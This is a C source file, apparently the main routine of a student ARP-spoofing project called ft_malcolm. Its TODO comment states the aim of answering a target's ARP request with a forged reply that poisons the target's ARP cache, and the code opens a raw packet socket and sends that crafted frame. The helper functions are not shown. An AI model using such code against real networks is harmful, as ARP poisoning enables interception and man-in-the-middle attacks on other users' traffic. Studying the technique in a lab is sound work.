# include "ft_malcolm.h"

/* TODO: 
	- Check parameters to be sure (order, host, etc)
	- create socket, recvfrom and sendto
	- Final goal is to wait for an arp request from the target and
		give an arp reply to poison the arp cache of the target.
*/

int main(int argc, char **argv) {
	if (argc != 5) {
		printf_fd(2, "[ERROR] main : Invalid number of parameters.\n");
		return(1);
	}

	int	sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sockfd < 0) {
		printf_fd(2, "[ERROR] main : Failed to create the socket.\n");
		return (1);
	}

	t_malcolm	*data = init_struct(argv[2], argv[4], argv[1], argv[3]);
	if (data == NULL) {
		return(close(sockfd), 1);
	}
	data->sockfd = sockfd;

	if (set_sockadrr_ll(&(data->addr), data->dst_mac_addr) < 0) {
		printf_fd(2, "[ERROR] main : Couldn't set sockaddr_ll.\n");
		return(clean_malcolm(data), 1);
	}
	
	if (set_frame(data, REPLY) < 0) {
		printf_fd(2, "[ERROR] main : Couldn't set frame.\n");
		return(clean_malcolm(data), 1);
	}
	check_request(data);

	sendto(sockfd, &data->buf, sizeof(data->buf), 0, (struct sockaddr *)&data->addr, sizeof(data->addr));
	clean_malcolm(data);
	return(0);
}